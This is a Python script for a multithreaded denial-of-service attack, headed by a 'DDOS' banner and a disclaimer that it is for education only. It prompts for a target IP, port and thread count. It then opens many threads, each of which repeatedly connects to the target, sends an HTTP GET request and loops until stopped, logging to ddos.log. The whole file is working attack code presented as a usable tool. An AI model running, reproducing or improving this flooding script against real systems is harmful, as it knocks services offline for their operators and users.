import socket
import threading
import time
import argparse
import logging
import os
import sys

def display_banner():
    banner = r"""
    ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
    ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░
    """
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)

# Configure logging
logging.basicConfig(filename='ddos.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def attack(target_ip, target_port):
    while True:  # Continuous attack until stopped
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((target_ip, target_port))
                logging.info(f"Connected to {target_ip}:{target_port}")
                # Send some data to keep connection open
                s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                time.sleep(1)  # Maintain connection briefly
        except Exception as e:
            logging.error(f"Error: {e}")
            time.sleep(0.5)

def start_attack(target_ip, target_port, num_threads):
    threads = []
    try:
        for _ in range(num_threads):
            thread = threading.Thread(target=attack, args=(target_ip, target_port))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        sys.exit(0)

def main():
    display_banner()

    print("""
    DISCLAIMER:
    This script is for educational purposes only. 
    Do not use it for illegal or malicious activities.
    The author is not responsible for any misuse of this script.
    """)

    try:
        target_ip = input("Enter the target IP address: ")
        target_port = int(input("Enter the target port: "))
        num_threads = int(input("Enter the number of threads (default: 10): ") or 10)

        print(f"\nStarting attack on {target_ip}:{target_port} with {num_threads} threads...")
        print("Press Ctrl+C to stop the attack\n")
        
        start_attack(target_ip, target_port, num_threads)

    except ValueError:
        print("Error: Invalid input! Please enter valid numbers for port and threads.")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()